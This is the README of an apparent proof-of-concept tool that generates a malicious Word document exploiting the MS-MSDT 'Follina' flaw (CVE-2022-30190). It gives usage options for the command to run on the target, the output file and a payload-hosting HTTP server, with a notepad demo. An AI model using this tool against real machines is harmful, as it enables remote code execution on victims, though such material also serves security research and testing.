# MS-MSDT Attack Vector

# Usage

```
usage: modify_maldoc.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]

options:
  -h, --help            show this help message and exit
  --command COMMAND, -c COMMAND
                        command to run on the target machine (default: start chrome.exe
                        "https://www.youtube.com/watch?v=WYmZpTBNG4w&t=30s")
  --output OUTPUT, -o OUTPUT
                        output maldoc file (default: ./maldoc_CVE-2022-30190.doc)
  --interface INTERFACE, -i INTERFACE
                        network interface or IP address to host HTTP server (default: eth0)
  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
```

# Examples


Pop `notepad.exe`:

```
$ ./modify_maldoc.py -c "notepad.exe"
```
